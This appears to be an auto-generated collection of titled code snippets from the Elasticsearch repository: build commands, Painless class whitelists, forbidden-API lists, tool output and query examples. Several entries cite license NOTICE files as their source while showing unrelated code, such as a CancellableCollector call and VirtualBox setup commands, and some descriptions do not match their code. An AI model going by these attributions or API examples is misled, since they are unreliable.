http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Running OneDrive Connector Tests in Shell\nDESCRIPTION: This shell command is used to execute end-to-end functional tests for the OneDrive connector within Elasticsearch. It leverages the Elasticsearch integration testing utility to ensure proper connector deployment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\n$ make ftest NAME=onedrive\n```\n\n----------------------------------------\n\nTITLE: Embedding SVG Image in Markdown for LOG Function Syntax\nDESCRIPTION: This snippet embeds an SVG image that visually represents the syntax of the LOG function in ESQL documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/log.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/log.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Azure VM Creation Command Output\nDESCRIPTION: Sample output from the Azure VM creation command, showing the steps taken to provision the VM, including looking up the image, creating the cloud service, and configuring the certificate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_7\n\nLANGUAGE: text\nCODE:\n```\ninfo:    Executing command vm create\n+ Looking up image\n+ Looking up cloud service\n+ Creating cloud service\n+ Retrieving storage accounts\n+ Configuring certificate\n+ Creating VM\ninfo:    vm create command OK\n```\n\n----------------------------------------\n\nTITLE: Running Async Profiler\nDESCRIPTION: Command for running benchmarks with async profiler integration for flame graph generation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/benchmarks/README.md#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngradlew -p benchmarks/ run --args 'LongKeyedBucketOrdsBenchmark.multiBucket -prof \"async:libPath=/home/nik9000/Downloads/async-profiler-3.0-29ee888-linux-x64/lib/libasyncProfiler.so;dir=/tmp/prof;output=flamegraph\"'\n```\n\n----------------------------------------\n\nTITLE: Eagerly Creating a Gradle Task (Not Recommended)\nDESCRIPTION: Example of eagerly creating a Gradle task, which is not recommended as it executes the configuration block immediately, increasing build configuration time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/BUILDING.md#2025-04-21_snippet_3\n\nLANGUAGE: groovy\nCODE:\n```\ntask someTask { ... }\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing for OpenText Documentum Connector in Shell\nDESCRIPTION: This shell command allows users to run functional tests against the OpenText Documentum connector using Docker Compose. It does not require a running Elasticsearch instance or OpenText Documentum to perform the tests. The command can be modified with a data size parameter for varying test scales.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-opentext.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n\"$ make ftest NAME=opentext_documentum\"\n```\n\nLANGUAGE: shell\nCODE:\n```\n\"make ftest NAME=opentext_documentum DATA_SIZE=small\"\n```\n\n----------------------------------------\n\nTITLE: Restricted Random Number Generation\nDESCRIPTION: Defines randomness-related classes that should be avoided, recommending org.elasticsearch.common.Randomness#get instead for reproducible sources of randomness.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage Use org.elasticsearch.common.Randomness#get for reproducible sources of randomness\njava.util.Random#<init>()\njava.util.concurrent.ThreadLocalRandom\n```\n\n----------------------------------------\n\nTITLE: Downloading PostgreSQL Example Data\nDESCRIPTION: cURL command to download the Chinook dataset SQL file for PostgreSQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ncurl -L https://raw.githubusercontent.com/lerocha/chinook-database/master/ChinookDatabase/DataSources/Chinook_PostgreSql.sql -o ~/data/Chinook_PostgreSql.sql\n```\n\n----------------------------------------\n\nTITLE: Static Import for IP Field Script Emit Callback\nDESCRIPTION: Configures a static import for the `emit` callback method, which is used to collect values in IP field scripts with Painless scripting\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ip_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nstatic_import {\n    void emit(org.elasticsearch.script.IpFieldScript, String) bound_to org.elasticsearch.script.IpFieldScript$Emit\n}\n```\n\n----------------------------------------\n\nTITLE: Restricting Application Termination Methods\nDESCRIPTION: Forbids methods that terminate the JVM, as they can cause abrupt shutdown of Elasticsearch clusters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_14\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Please do not terminate the application\njava.lang.System#exit(int)\njava.lang.Runtime#exit(int)\njava.lang.Runtime#halt(int)\n```\n\n----------------------------------------\n\nTITLE: Generating Disjunction of Function and Negated Function Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a query combining a function and its negation in Elasticsearch. It checks for user length conditions with both positive and negative assertions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_27\n\nLANGUAGE: eql\nCODE:\n```\nprocess where not (length(user) == 1) and length(user) == 1\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"bool\":{\"must\":[{\"script\":{\"script\":{\"source\":\"InternalQlScriptUtils.not(InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalEqlScriptUtils.length(X0),params.v1))))\",\"params\":{\"v0\":\"user\",\"v1\":1}}}},{\"script\":{\"script\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalEqlScriptUtils.length(X0),params.v1)))\",\"params\":{\"v0\":\"user\",\"v1\":1}}}}]}}\n```\n\n----------------------------------------\n\nTITLE: Example Output of Corrupted Data Removal\nDESCRIPTION: Shows the complete output of running the elasticsearch-shard tool to remove corrupted data, including warnings, analysis results, and required follow-up actions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/shard-tool.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\n$ bin/elasticsearch-shard remove-corrupted-data --index my-index-000001 --shard-id 0\n\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\n  Please make a complete backup of your index before using this tool.\n\n\nOpening Lucene index at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/index/\n\n >> Lucene index is corrupted at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/index/\n\nOpening translog at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/translog/\n\n\n >> Translog is clean at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/translog/\n\n\n  Corrupted Lucene index segments found - 32 documents will be lost.\n\n            WARNING:              YOU WILL LOSE DATA.\n\nContinue and remove docs from the index ? Y\n\nWARNING: 1 broken segments (containing 32 documents) detected\nTook 0.056 sec total.\nWriting...\nOK\nWrote new segments file \"segments_c\"\nMarking index with the new history uuid : 0pIBd9VTSOeMfzYT6p0AsA\nChanging allocation id V8QXk-QXSZinZMT-NvEq4w to tjm9Ve6uTBewVFAlfUMWjA\n\nYou should run the following command to allocate this shard:\n\nPOST /_cluster/reroute\n{\n  \"commands\" : [\n    {\n      \"allocate_stale_primary\" : {\n        \"index\" : \"index42\",\n        \"shard\" : 0,\n        \"node\" : \"II47uXW2QvqzHBnMcl2o_Q\",\n        \"accept_data_loss\" : false\n      }\n    }\n  ]\n}\n\nYou must accept the possibility of data loss by changing the `accept_data_loss` parameter to `true`.\n\nDeleted corrupt marker corrupted_FzTSBSuxT7i3Tls_TgwEag from /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/index/\n```\n\n----------------------------------------\n\nTITLE: Defining Finnish Stop Words\nDESCRIPTION: Provides Finnish stop words for use in Elasticsearch analysis, with a direct link to Lucene.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_17\n\nLANGUAGE: markdown\nCODE:\n```\n`_finnish_`\n:   [Finnish stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/finnish_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Creating GPL License Header for Source Files\nDESCRIPTION: A template notice to attach to the start of each source file to convey copyright information and GPL terms. It includes the program description, copyright statement, and standard GPL redistribution and warranty clauses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\n    One line to give the program's name and a brief idea of what it does.\n    Copyright (C) <year> <name of author>\n\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful, but\n    WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n    General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program; if not, write to the Free Software\n    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: GPL License Notice Template\nDESCRIPTION: Standard copyright and license notice template to be added at the start of source files when applying the GPL license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-core-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Output Document After Nested Path Expansion\nDESCRIPTION: Shows the result after expanding nested dotted fields using the path option.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_12\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\" : {\n    \"bar\" : {\n      \"one\" : \"value\",\n      \"two\" : \"value\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Min Bucket Aggregation Response Example\nDESCRIPTION: Shows the response format for a min_bucket aggregation including the bucket data and minimum value result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-min-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               }\n            }\n         ]\n      },\n      \"min_monthly_sales\": {\n          \"keys\": [\"2015/02/01 00:00:00\"],\n          \"value\": 60.0\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CancellableCollector with a Task reference for cancellation\nDESCRIPTION: This example shows creating a CancellableCollector that checks a Task's cancellation status periodically during collection operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/slf4j-nop-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nCancellableCollector<Document> cancellableCollector = CancellableCollector.newCollector(\n    Collectors.toList(),\n    () -> task.ensureNotCancelled()  // Using a Task's cancellation check\n);\n```\n\n----------------------------------------\n\nTITLE: Defining Clock Class\nDESCRIPTION: This code snippet defines the `java.time.Clock` class and lists its methods, including `fixed`, `getZone`, `instant`, `millis`, `offset`, and `tick`. The `@nondeterministic` annotation suggests that these methods might return different results on different invocations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.Clock {\\n  Clock fixed(Instant,ZoneId)\\n  ZoneId getZone() @nondeterministic\\n  Instant instant() @nondeterministic\\n  long millis() @nondeterministic\\n  Clock offset(Clock,Duration) @nondeterministic\\n  Clock tick(Clock,Duration) @nondeterministic\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Document Security Filter Implementation Example\nDESCRIPTION: Example showing how security filters are applied to documents in Elasticsearch. This demonstrates the internal transformation of a user query to include security constraints.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/protobuf-java-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n{\n  \"bool\": {\n    \"must\": [\n      {\n        \"match\": {\n          \"title\": \"foo\"\n        }\n      }\n    ],\n    \"filter\": [\n      {\n        \"terms\": {\n          \"access_group\": [\"group1\", \"group2\", \"group3\"]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Routing Formula for Shard Selection in Elasticsearch\nDESCRIPTION: Formula showing how documents are routed to a particular shard in an index based on the routing value, number of routing shards, and number of primary shards.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-routing-field.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nrouting_factor = num_routing_shards / num_primary_shards\nshard_num = (hash(_routing) % num_routing_shards) / routing_factor\n```\n\n----------------------------------------\n\nTITLE: Bypassing Version Checks\nDESCRIPTION: Shows how to override version compatibility checks in the data path to allow node startup with incompatible versions. Includes warnings about potential data loss.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_10\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node override-version\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nThis data path was last written by Elasticsearch version [x.x.x] and may no\nlonger be compatible with Elasticsearch version [y.y.y]. This tool will bypass\nthis compatibility check, allowing a version [y.y.y] node to start on this data\npath, but a version [y.y.y] node may not be able to read this data or may read\nit incorrectly leading to data loss.\n\nYou should not use this tool. Instead, continue to use a version [x.x.x] node\non this data path. If necessary, you can use reindex-from-remote to copy the\ndata from here into an older cluster.\n\nDo you want to proceed?\n\nConfirm [y/N] y\nSuccessfully overwrote this node's metadata to bypass its version compatibility checks.\n```\n\n----------------------------------------\n\nTITLE: Listing Available Azure VM Images\nDESCRIPTION: Command to list all available VM images in Azure, which helps in selecting the appropriate operating system for your Elasticsearch nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\nazure vm image list\n```\n\n----------------------------------------\n\nTITLE: Running Java Unit Tests for APM Data Plugin\nDESCRIPTION: Gradle command to execute unit tests for the APM data plugin, covering low-level parsing and resource loading functionality\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/apm-data/README.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew x-pack:plugin:apm-data:test\n```\n\n----------------------------------------\n\nTITLE: Linked HashSet Implementation in Java\nDESCRIPTION: This snippet defines the LinkedHashSet class, which combines the advantages of HashSet with a linked list to maintain the order of elements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_25\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.LinkedHashSet {\n  ()\n  (Collection)\n}\n```\n\n----------------------------------------\n\nTITLE: Single-line Comments in Painless\nDESCRIPTION: Examples of single-line comments in Painless scripts. Shows how to create standalone comments and how to add comments at the end of code lines.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-comments.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\n// single-line comment\n\nint value; // single-line comment\n```\n\n----------------------------------------\n\nTITLE: Preserve Data Option for Manually Run Node\nDESCRIPTION: This command starts a manually controlled ElasticSearch node while preserving the data restored from snapshots using the `--preserve-data` parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew :x-pack:plugin:eql:qa:correctness:runEqlCorrectnessNode --debug-jvm --preserve-data\n```\n\n----------------------------------------\n\nTITLE: Initializing InternalEqlScriptUtils Utility Class for EQL Scripting\nDESCRIPTION: Java class providing advanced string manipulation, comparison, and utility methods specifically for Elasticsearch Event Query Language (EQL) scripting environment\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/main/resources/org/elasticsearch/xpack/eql/plugin/eql_whitelist.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.eql.expression.function.scalar.whitelist.InternalEqlScriptUtils {\n  Boolean multiValueDocValues(java.util.Map, String, java.util.function.Predicate)\n  String between(String, String, String, Boolean, Boolean)\n  Boolean cidrMatch(String, java.util.List)\n  String concat(java.util.List)\n  Boolean endsWith(String, String, Boolean)\n  Integer indexOf(String, String, Number, Boolean)\n  Integer length(String)\n  Number number(String, Number)\n  String string(Object)\n  Boolean stringContains(String, String, Boolean)\n  String substring(String, Number, Number)\n}\n```\n\n----------------------------------------\n\nTITLE: Preventing Java Serialization for Backward Compatibility\nDESCRIPTION: Bans Java serialization mechanisms that can break backward compatibility without obvious errors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Don't use java serialization - this can break BWC without noticing it\njava.io.ObjectOutputStream\njava.io.ObjectOutput\njava.io.ObjectInputStream\njava.io.ObjectInput\n```\n\n----------------------------------------\n\nTITLE: Adding Debian Package Repository for VirtualBox\nDESCRIPTION: A sequence of commands for adding the official VirtualBox Debian package repository to the system and installing VirtualBox.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nwget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -\nsudo sh -c 'echo \"deb http://download.virtualbox.org/virtualbox/debian precise contrib\" >> /etc/apt/sources.list.d/virtualbox.list'\nsudo apt-get update\nsudo apt-get install virtualbox-4.2\n```\n\n----------------------------------------\n\nTITLE: Calculating Distance Between Points with ST_Distance in Elasticsearch SQL\nDESCRIPTION: Calculates the distance in meters between two geometry points. Both input geometries must be points. Returns a double value representing the distance in meters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nST_Distance(\n    geometry, <1>\n    geometry  <2>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ST_Distance(ST_WKTToSQL('POINT (10 20)'), ST_WKTToSQL('POINT (20 30)')) distance;\n\n   distance:d\n1499101.2889383635\n```\n\n----------------------------------------\n\nTITLE: Validating Elasticsearch Configuration Settings (Java)\nDESCRIPTION: This test checks if Elasticsearch correctly validates configuration settings, including handling of deprecated options and ensuring required settings are present.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/google-http-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n@Test\npublic void testValidate() {\n    Settings settings = Settings.builder()\n        .put(\"cluster.routing.allocation.disk.threshold_enabled\", \"false\")\n        .put(\"cluster.routing.allocation.disk.watermark.low\", \"85%\")\n        .put(\"cluster.routing.allocation.disk.watermark.low.max_headroom\", \"200GB\")\n        .put(\"cluster.routing.allocation.disk.watermark.high\", \"87%\")\n        .put(\"cluster.routing.allocation.disk.watermark.high.max_headroom\", \"100GB\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage\", \"97%\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage.max_headroom\", \"5GB\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage.frozen\", \"95%\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage.frozen.max_headroom\", \"20GB\")\n        .build();\n    new DiskThresholdSettings(settings);\n\n    settings = Settings.builder()\n        .put(\"cluster.routing.allocation.disk.watermark.low\", \"85%\")\n        .put(\"cluster.routing.allocation.disk.watermark.high\", \"87%\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage\", \"97%\")\n        .build();\n    new DiskThresholdSettings(settings);\n\n    settings = Settings.builder()\n        .put(\"cluster.routing.allocation.disk.watermark.low\", \"85%\")\n        .put(\"cluster.routing.allocation.disk.watermark.high\", \"87%\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage\", \"97%\")\n        .put(\"cluster.routing.allocation.disk.watermark.flood_stage.frozen\", \"95%\")\n        .build();\n    new DiskThresholdSettings(settings);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AttributedCharacterIterator Interface in Java\nDESCRIPTION: Interface definition for AttributedCharacterIterator class that provides methods for working with attributed text. This interface extends functionality for iterating over text while maintaining character attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.text.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.AttributedCharacterIterator {\n  Set getAllAttributeKeys()\n  def getAttribute(AttributedCharacterIterator.Attribute)\n  Map getAttributes()\n  int getRunLimit()\n  int getRunLimit(Set)\n  int getRunStart()\n  int getRunStart(Set)\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Proxy Settings for Elasticsearch Plugin Installation on Windows\nDESCRIPTION: Shows how to configure HTTP and HTTPS proxy settings for plugin installation on Windows systems by setting Java options through the CLI_JAVA_OPTS environment variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/_other_command_line_parameters.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nset CLI_JAVA_OPTS=\"-Dhttp.proxyHost=host_name -Dhttp.proxyPort=port_number -Dhttps.proxyHost=host_name -Dhttps.proxyPort=https_port_number\"\nbin\\elasticsearch-plugin install analysis-icu\n```\n\n----------------------------------------\n\nTITLE: Restricting OS-Dependent File Hiding Detection\nDESCRIPTION: Discourages the use of Files.isHidden method due to its operating system dependency, recommending an alternative utility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_5\n\nLANGUAGE: plaintext\nCODE:\n```\njava.nio.file.Files#isHidden(java.nio.file.Path) @ Dependent on the operating system, use FileSystemUtils.isHidden instead\n```\n\n----------------------------------------\n\nTITLE: Returning Euler's Number in ESQL\nDESCRIPTION: This function returns Euler's number, a mathematical constant approximately equal to 2.71828. It is a fundamental constant used in various mathematical and scientific calculations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/e.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Defining Abstract Collection Classes in Java\nDESCRIPTION: This snippet defines several abstract collection classes in the java.util package. These classes serve as the foundational bases for specific collection implementations in Java's collection framework.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.AbstractCollection {\n}\n\nclass java.util.AbstractList {\n}\n\nclass java.util.AbstractMap {\n}\n\nclass java.util.AbstractMap$SimpleEntry {\n  (def,def)\n  (Map.Entry)\n}\n\nclass java.util.AbstractMap$SimpleImmutableEntry {\n  (def,def)\n  (Map.Entry)\n}\n\nclass java.util.AbstractQueue {\n}\n\nclass java.util.AbstractSequentialList {\n}\n\nclass java.util.AbstractSet {\n}\n```\n\n----------------------------------------\n\nTITLE: DEBUG Level Logging Example in Elasticsearch (Java)\nDESCRIPTION: Illustrates DEBUG level logging in Elasticsearch, used for diagnosing unexpected problems in production systems without overwhelming log output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_15\n\nLANGUAGE: java\nCODE:\n```\nlogger.debug(\n    \"{}: coordinator becoming CANDIDATE in term {} (was {}, lastKnownLeader was [{}])\",\n    method,\n    getCurrentTerm(),\n    mode,\n    lastKnownLeader\n);\n```\n\n----------------------------------------\n\nTITLE: Verifying PostgreSQL Table Creation\nDESCRIPTION: Docker command to list tables in the 'chinook' database, verifying that the example data was imported correctly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ndocker exec -it postgres psql -U myuser -d chinook -c \"\\dt\"\n```\n\n----------------------------------------\n\nTITLE: Update By Query Script Interaction\nDESCRIPTION: Provides script interaction methods for accessing metadata and manipulating fields during update by query operations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update_by_query.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.UpdateByQueryScript {\n    Metadata metadata()\n    WriteField field(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Stable Plugin Descriptor Template\nDESCRIPTION: Template for creating a stable-plugin-descriptor.properties file for Elasticsearch plugins. This configuration file defines essential metadata and requirements for the plugin including description, version, Java compatibility, and optional features like native controllers and licensing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/plugin-descriptor-file-stable.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Elasticsearch plugin descriptor file\n# This file must exist as 'plugin-descriptor.properties' or 'stable-plugin-descriptor.properties inside a plugin.\n#\n## example plugin for \"foo\"\n#\n# foo.zip <-- zip file for the plugin, with this structure:\n# |____   <arbitrary name1>.jar <-- classes, resources, dependencies\n# |____   <arbitrary nameN>.jar <-- any number of jars\n# |____   plugin-descriptor.properties <-- example contents below:\n#\n# classname=foo.bar.BazPlugin\n# description=My cool plugin\n# version=6.0\n# elasticsearch.version=6.0\n# java.version=1.8\n#\n## mandatory elements for all plugins:\n#\n# 'description': simple summary of the plugin\ndescription=${description}\n#\n# 'version': plugin's version\nversion=${version}\n#\n# 'name': the plugin name\nname=${name}\n#\n# 'java.version': version of java the code is built against\n# use the system property java.specification.version\n# version string must be a sequence of nonnegative decimal integers\n# separated by \".\"'s and may have leading zeros\njava.version=${javaVersion}\n#\n# 'elasticsearch.version': version of elasticsearch compiled against.\n# Plugins implementing plugin-api.jar this version only has to match a major version of the ES server\n# For all other plugins it has to be the same as ES server version\nelasticsearch.version=${elasticsearchVersion}\n## optional elements for plugins:\n<% if (classname) { %>\n#\n# 'classname': the name of the class to load, fully-qualified. Only applies to\n# \"isolated\" plugins\nclassname=${classname}\n<% } %>\n<% if (modulename) { %>\n#\n# 'modulename': the name of the module to load classname from. Only applies to\n# \"isolated\" plugins. This is optional. Specifying it causes the plugin\n# to be loaded as a module.\nmodulename=${modulename}\n<% } %>\n<% if (extendedPlugins) { %>\n#\n#  'extended.plugins': other plugins this plugin extends through SPI\nextended.plugins=${extendedPlugins}\n<% } %>\n<% if (hasNativeController) { %>\n#\n# 'has.native.controller': whether or not the plugin has a native controller\nhas.native.controller=${hasNativeController}\n<% } %>\n<% if (licensed) { %>\n# This plugin requires that a license agreement be accepted before installation\nlicensed=${licensed}\n<% } %>\n```\n\n----------------------------------------\n\nTITLE: Executing Functional Tests for Network Drive Connectors - Shell\nDESCRIPTION: Shell commands demonstrate the execution of functional tests for Elasticsearch's 